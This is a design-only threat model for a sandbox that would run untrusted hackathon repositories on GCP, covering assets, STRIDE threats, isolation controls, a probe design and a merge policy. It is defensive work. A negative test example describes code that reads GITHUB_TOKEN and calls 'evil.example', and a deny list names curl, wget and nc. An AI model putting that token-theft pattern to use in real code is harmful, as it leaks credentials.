# Phase 19 — Runtime sandbox threat model and security design

**Status: DESIGN ONLY. Not implemented. Not reviewed. Untrusted repositories must not be executed.**

**Decision: STOP.** Safe isolation cannot be guaranteed in the current deployment. Do not run third-party repository code until the review checklist at the end of this document is signed off in GCP, not only in application source.

This document is the review artifact. Runtime analysis (probes that start an app, call HTTP, or invoke model clients) is **out of scope for code** until that review completes.

---

## 1. Goal

Answer questions static analysis cannot prove, for example:

- Does the frontend actually reach the backend at runtime?
- Does the app attempt a real AI request?
- Does changing user input alter the AI request payload?
- Is model output returned to the application?

Runtime findings **supplement** static findings. They must never silently overwrite deterministic static evidence.

Today the analyser is safe on this axis: it fetches files through the GitHub API and parses them. It does **not** clone, `pip install`, `npm install`, or `eval` submission code.

---

## 2. Assets to protect

| Asset | Where it lives today | If leaked |
|---|---|---|
| FastAPI service process | Cloud Run service `github-analyser` | Request forgery, job injection, DoS |
| Static analyser / Code Facts pipeline | Same image, Cloud Run Job `github-analyser-worker` | Poisoned reports, worker DoS |
| Firebase Admin private key | Secret Manager → env on API **and** worker | Full Firestore read/write, job tampering |
| GitHub token | Secret Manager → env on API **and** worker | Repo access, rate-limit theft, org data |
| Vertex / GCP ADC | Runtime SA `github-analyser-sa@…` | Gemini spend, GCP API abuse |
| Firestore job documents | Collection `github_analysis_jobs` | Forged scores, PII in context text |
| Judge / organizer trust | Result JSON | Wrong winners, contested judging |

The Phase 18 worker is **not** a sandbox. It mounts the same secrets as the API (`FIREBASE_*`, `GITHUB_TOKEN`) and uses the same service account.

---

## 3. Trust boundaries

```
[Judge client]
    │ HTTPS
    ▼
[Cloud Run API]  ← trusted, has secrets
    │ Firestore job + run.jobs.run
    ▼
[Cloud Run Job: static worker]  ← trusted analyser, has secrets
    │ GitHub API (token)
    ▼
[Untrusted repo contents as data]  ← untrusted bytes, currently parsed only

FUTURE (not built):
[Static worker] -- unsigned artifact --> [Sandbox job] -- result object --> [Static worker]
                                         ↑
                         MUST NOT see secrets, Vertex, Firestore, GitHub token
```

Untrusted code is anything from the submission: Python/JS sources, `package.json` scripts, Dockerfiles, GitHub Actions, native extensions, `sitecustomize.py`, test fixtures.

---

## 4. Adversary model

Assume a motivated hackathon team that can publish a public GitHub repo. They control every file the analyser fetches. They do not have our GCP console, but they can:

- Plant payloads that run on `import`, module load, or test collection
- Read process environment and metadata server
- Open network connections
- Fork bombs / infinite loops / memory bombs
- Write to `/proc`, attempt container escape
- Exfiltrate via DNS, HTTP, or the metadata IP `169.254.169.254`
- Poison runtime evidence so a fake-AI app looks genuine

We assume they cannot break Google’s hypervisor, but we **do not** assume they cannot read env vars in the same container.

---

## 5. Threats (STRIDE)

| ID | Threat | Impact | Current exposure if we executed in the Phase 18 worker |
|---|---|---|---|
| T1 | Read `GITHUB_TOKEN` / Firebase key from env | Credential theft | **Certain** — secrets are in the worker environment |
| T2 | Hit GCP metadata server, mint SA tokens | Vertex spend, Firestore, Secret Manager | **High** — default Cloud Run SA + metadata |
| T3 | SSRF / exfil to attacker server | Data leak, C2 | **High** — default egress is the public internet |
| T4 | Crypto miner / fork bomb | Cost, eviction, noisy neighbor | **High** — 1 CPU / 1Gi is still abuse-able without cgroup isolation from *our* process |
| T5 | Overwrite Firestore job `result` | Forged scores | **Certain** if Firebase creds present |
| T6 | Escape into API container | Full compromise | **N/A if separate job**; **critical** if subprocess of API or static worker |
| T7 | `pip install` / `npm install` postinstall scripts | Arbitrary code + network | **High** without an allowlisted offline wheelhouse |
| T8 | Lie to the judge via runtime logs | Wrong classification | Medium — must not override static proof |
| T9 | Time-of-check vs execute different code | Bypass probes | Medium — pin commit SHA already fetched |
| T10 | Prompt/runtime side channel to Vertex | Cost + data to Google as us | **High** if Vertex ADC is visible |

T1, T2, T5, T6, T10 are **disqualifying** for any design that runs untrusted code in the existing API or `github-analyser-worker` job.

---

## 6. Isolation requirements (must all hold)

| Requirement | Acceptable control | Not acceptable |
|---|---|---|
| Separate execution boundary | Dedicated Cloud Run Job **or** GCE + gVisor/Firecracker, different job name, different SA | `subprocess` in API or static worker |
| Strict CPU | Job `--cpu=1` (or less) **and** cgroup limit inside the probe | Honor-system `time` only |
| Strict memory | Job `--memory=512Mi` (max 1Gi) | Sharing the 1Gi static worker |
| Strict timeout | Job `--task-timeout=90s` **and** harness wall clock; kill process group | Rely on Cloud Run request timeout of the API |
| No production secrets | No Secret Manager mounts; no `FIREBASE_*`; no `GITHUB_TOKEN`; no Vertex key | Filtering env in Python (child can still read parent `/proc`) |
| Restricted filesystem | Read-only root; writable `/tmp` only, wiped on exit (Cloud Run ephemeral disk) | Writing into the analyser image or Firestore |
| Restricted service account | New SA with **no** `secretmanager`, `datastore`, `aiplatform`, `iam`. Optional: `storage.objectCreator` on one prefix only | Reuse `github-analyser-sa` |
| Controlled / disabled egress | Direct VPC + Cloud Firewall **deny all** except Private Google Access to GCS; metadata concealment | “Please don’t call the network” in the harness |
| Automatic cleanup | Job task ends → disk gone; GCS objects lifecycle 1 day | Leftover `/tmp` on a reused VM |
| Command allow/deny | Harness is the only PID 1 command: `python -m app.runtime.harness`. No `bash`, no `curl` from the repo’s scripts | Running `npm start` / `uvicorn` from their README |
| Package install | **No install from the internet.** Either stdlib-only probes, or a reviewed offline wheelhouse | `pip install -r requirements.txt` as the submission |
| Runtime logs / evidence | Structured JSON captured by the harness, size-capped, returned via GCS | Letting the guest write Firestore |

If any row cannot be met in GCP **before** merge, execution stays disabled.

---

## 7. Proposed architecture (for review — not built)

Trusted path stays as today:

1. API validates URL, creates Firestore job, triggers **static** worker.
2. Static worker fetches tree + files with the GitHub token, builds `AnalysisContext`, scores, writes result.

Proposed untrusted path (future):

3. Static worker (trusted) packs **already-fetched** files for the pinned `commit_sha` into a tarball (max size, max file count). No git clone.
4. Uploads tarball to `gs://<sandbox-bucket>/jobs/<job_id>/src.tar` using the **static** SA.
5. Triggers a **different** Cloud Run Job `github-analyser-sandbox` with env:
   - `ANALYSIS_JOB_ID`
   - `SANDBOX_TARBALL=gs://…/src.tar`
   - `SANDBOX_OUT=gs://…/runtime.json`
   - **No secrets.**
6. Sandbox SA may only `storage.objects.get` that prefix and `storage.objects.create` the output object.
7. Harness unpacks to `/tmp/src`, runs **our** probes with `prlimit` / process group kill, writes `runtime.json`.
8. Static worker reads `runtime.json` after the job completes (or times out), **merges as a sibling**, never as a replacement of static fields.
9. GCS lifecycle deletes objects after 24h. Cloud Run task filesystem is discarded.

Network for `github-analyser-sandbox`:

- Direct VPC egress
- Firewall: deny `0.0.0.0/0` and `::/0`
- Allow only restricted Google APIs (GCS) via Private Google Access
- Block `169.254.169.254` except if Google requires it for GCS; prefer mounted GCS via the client library with no broader cloud-platform scope
- `DISABLE_CLOUD_RUN_METADATA` / custom audience: do not grant `cloud-platform`

CPU / memory / time (initial):

| Limit | Value |
|---|---|
| vCPU | 1 |
| Memory | 512Mi |
| Task timeout | 90 seconds |
| Harness wall clock | 60 seconds |
| Output JSON | 64 KiB |
| Log capture | 32 KiB |
| Source tarball | 15 MiB, ≤ 80 files (same parse cap as static) |

---

## 8. Command and package policy

**Allow**

- PID 1: `/app/.venv/bin/python -m app.runtime.harness` (our code, image-baked)
- Child: only binaries we ship (`python`, `node` if we add a JS probe later), invoked by the harness with an explicit argv
- Imports of submission modules **only** through the harness after AST/path checks (no `eval` of README commands)

**Deny**

- `bash -c`, `sh`, `curl`, `wget`, `nc`, `docker`, `sudo`, `pip`, `npm`, `pnpm`, `yarn`, `uv pip install`
- Running the submission’s `package.json` `scripts`
- Compiling native extensions
- Binding ports other than `127.0.0.1` inside the task (and only if a probe needs a server)

**Packages**

- Do not install submission dependencies from the network.
- Probes that need FastAPI/Flask/OpenAI clients should use **our** preinstalled stubs (`app.runtime.fakes`) that record calls.
- If a probe cannot import the app without third-party deps, the runtime result is `status: skipped`, reason `missing_runtime_dependencies`, not a guessed success.

---

## 9. Probe design (what runtime is allowed to claim)

Probes are **ours**. They load submission files as data or as imported modules under the policy above.

| Probe | Question | Positive signal | Negative / unknown |
|---|---|---|---|
| P1 HTTP loopback | Frontend reach backend? | Harness starts detected ASGI/WSGI **if** import succeeds, `GET/POST` to a static-discovered route on `127.0.0.1`, status 2xx/4xx from that app | Import failed, no server, timeout → `unknown` |
| P2 AI intercept | Real AI request attempted? | `sitecustomize` / patched `httpx` sees outbound URL host in `{api.openai.com, generativelanguage.googleapis.com, …}` **or** SDK method called | No call in 60s → does not prove absence beyond this probe |
| P3 Input delta | Changing input alters AI request? | Two harness requests; captured request bodies differ in the user-controlled field | One shot only, or identical bodies → `false` or `unknown` |
| P4 Output return | AI output returned? | Intercepted mock completion string appears in HTTP response body | Mock not injected → `unknown` |

Mocks: P2–P4 must **not** use production Vertex credentials. The intercept layer swallows real egress (which should already be firewalled) and returns a canary token `RUNTIME_CANARY_<job_id>`.

---

## 10. Merge policy (runtime vs static)

Rules:

1. Static Code Facts, `ai_verification`, and EvidenceAggregator classifications remain the source of truth.
2. Runtime is a sibling object `runtime` on the job result (see sample JSON).
3. Runtime may set `runtime.frontend_backend.reached = true` while static `frontend_backend.connected` stays `"unknown"`.
4. Runtime must **not** flip `ai.classification` from `suspicious_ai_implementation` / `no_ai` to `genuine_ai_integration`.
5. If static already proved `user_input_reaches_model: true`, runtime cannot set it false.
6. If static is `unknown`/`false` and runtime observes a canary, record `runtime.ai.model_invocation_observed: true` plus evidence ids. The aggregator may later add a **new** conclusion id `AI_RUNTIME_OBSERVATION` without deleting `AI_CLASSIFICATION`.
7. Conflicts are listed in `runtime.conflicts[]` with both sides cited. The report `limitations[]` must include a human-readable sentence.

---

## 11. Sample JSON (proposed result fragment)

```json
{
  "ai": {
    "detected": true,
    "classification": "partial_ai_integration",
    "model_invocation_detected": true,
    "user_input_reaches_model": false,
    "model_output_used": true,
    "confidence": 0.85
  },
  "frontend_backend": {
    "connected": "unknown"
  },
  "runtime": {
    "status": "ok",
    "sandbox": {
      "isolated": true,
      "cpu_limit": "1",
      "memory_limit_mi": 512,
      "timeout_s": 60,
      "network": "deny_all_except_gcs",
      "service_account": "github-analyser-sandbox@PROJECT.iam.gserviceaccount.com"
    },
    "frontend_backend": {
      "reached": true,
      "method": "POST",
      "path": "/api/chat",
      "status_code": 200,
      "confidence": 0.7
    },
    "ai": {
      "model_invocation_observed": true,
      "input_changes_request": true,
      "output_returned_to_client": true,
      "provider_host": "api.openai.com",
      "egress_blocked": true,
      "canary": "RUNTIME_CANARY_abc123",
      "confidence": 0.65
    },
    "conflicts": [
      {
        "static_field": "frontend_backend.connected",
        "static_value": "unknown",
        "runtime_field": "runtime.frontend_backend.reached",
        "runtime_value": true,
        "explanation": "Static URLs were unresolved; loopback probe received HTTP 200 from the imported app."
      }
    ],
    "evidence": [
      {
        "id": "rt_001",
        "rule_id": "RT.HTTP_REACHED",
        "description": "POST /api/chat on 127.0.0.1 returned 200"
      },
      {
        "id": "rt_002",
        "rule_id": "RT.AI_REQUEST_INTERCEPTED",
        "description": "OpenAI client call captured; body changed when input changed; canary echoed in response"
      }
    ],
    "logs_truncated": false,
    "limitations": [
      "Sandbox has no submission pip packages; only probes that imported successfully ran."
    ]
  },
  "limitations": [
    "Frontend↔backend connectivity could not be proven from static URLs",
    "Runtime probe observed loopback HTTP 200; this does not change the static connected=unknown field"
  ]
}
```

Disabled / unreviewed (what we emit **until** isolation is guaranteed):

```json
{
  "runtime": {
    "status": "skipped",
    "reason": "sandbox_not_approved",
    "isolated": false,
    "explanation": "Untrusted execution is disabled until the runtime sandbox security design is reviewed and GCP isolation controls are in place."
  }
}
```

---

## 12. Test examples (to implement only after review)

**Positive (would pass after implementation):** a tiny FastAPI app that posts `body.message` to a mocked OpenAI client and returns the completion. Static may leave `connected` unknown if there is no frontend. Runtime P2–P4 observe invocation, input delta, and canary in the JSON response. Merge does not retitle classification to `genuine_ai_integration` by itself if static input-flow was unproven; it records `runtime.ai.*` and a conflict/limitation.

**Negative (must fail closed):** a repo whose `backend/app.py` on import reads `os.environ["GITHUB_TOKEN"]` and `urllib.request.urlopen("https://evil.example")`. The sandbox has no `GITHUB_TOKEN`; egress is denied. Probe result: `status: failed` or `skipped` with `reason: probe_exception` / timeout. Static analysis still succeeds. No secret appears in `runtime` logs (redact env keys). Job result is not overwritten with attacker-controlled JSON (schema-validate `runtime.json` in the trusted worker).

---

## 13. Why isolation cannot be guaranteed now

1. **Secrets in the only worker.** `cloudbuild.yaml` mounts Firebase keys and `GITHUB_TOKEN` on `github-analyser-worker`. Executing a submission there is credential theft (T1, T5).
2. **Same service account as production.** `github-analyser-sa` is intended for Vertex, Firestore, and Secret Manager. Metadata-server tokens would be production-scoped (T2, T10).
3. **Open egress.** No VPC connector, no org-level deny, no Cloud Run egress restriction is defined in this repo (T3).
4. **No second execution boundary.** Phase 18 reused one image and one SA for API vs static worker. A sandbox job does not exist.
5. **Cannot assert firewall from pytest.** Network deny and SA IAM are GCP control-plane facts. Application unit tests cannot prove them.
6. **Package install is unsafe by default.** Enabling `pip install` of submissions without an offline allowlist is RCE plus network (T7).
7. **Local inline mode.** When `CLOUD_RUN_JOB_NAME` is unset, analysis runs in the API process. Runtime execution there would share the FastAPI address space (T6).

Until (1)–(4) are changed in GCP and reviewed, **guaranteeing** isolation would be false confidence.

---

## 14. Review checklist (implementation gate)

Do not merge an executor until an owner confirms:

- [ ] Dedicated SA `github-analyser-sandbox@…` with no Secret Manager, Datastore, or Vertex roles
- [ ] Cloud Run Job `github-analyser-sandbox` with **zero** `--update-secrets`
- [ ] Egress deny-all except GCS (VPC + firewall or equivalent), documented and tested in staging
- [ ] Metadata / ADC cannot call `aiplatform` or Firestore
- [ ] Harness is the only entrypoint; submission scripts are never the PID 1 command
- [ ] CPU, memory, timeout set on the job and enforced in the harness
- [ ] Artifact bus is GCS prefix isolation per `job_id`; trusted worker validates JSON schema
- [ ] Merge policy implemented (sibling `runtime`, no silent overwrite)
- [ ] Red-team negative test (env steal + egress) run in staging against the sandbox job
- [ ] This document marked **Reviewed** with date and reviewer

---

## 15. Known limitations (even after a correct sandbox)

- Runtime cannot prove production behavior (real DNS, real API keys in the submission’s own `.env`, real CORS).
- Missing third-party packages ⇒ skipped probes, not a failed AI check.
- Intercepting SDKs is best-effort; a custom HTTP stack may evade P2–P4.
- Loopback HTTP does not prove a separate frontend host reached the backend.
- gVisor on Cloud Run is a strong layer, not a substitute for secret-free env and egress deny.
- Attackers can still waste 90s × CPU of sandbox quota (rate-limit sandbox triggers per job).

---

## 16. Explicit non-goals for this stop

- No `app.runtime` executor module.
- No `subprocess` of submission code in the API or static worker.
- No `pip install` of untrusted requirements.
- No change to scoring that treats runtime as more authoritative than static proof.
- No next phase.

Static analysis remains the only engine that runs against third-party repositories.
